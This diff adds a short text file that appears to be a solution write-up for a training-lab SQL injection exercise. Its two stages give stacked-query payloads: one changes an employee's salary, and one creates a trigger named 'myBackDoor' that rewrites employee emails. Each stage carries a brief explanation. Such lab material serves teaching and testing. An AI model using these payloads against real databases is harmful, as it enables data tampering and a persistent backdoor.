@@ -1,0 +1,11 @@
+Stage 1
+
+101; UPDATE employee SET salary=100000 WHERE userid=10
+
+The above line ends the select statement with ';', and inserts an update command to be executed after.
+
+Stage 2
+
+101; CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com'WHERE userid = NEW.userid
+
+The above line ends the select statement with ';', and then inserts a database trigger.
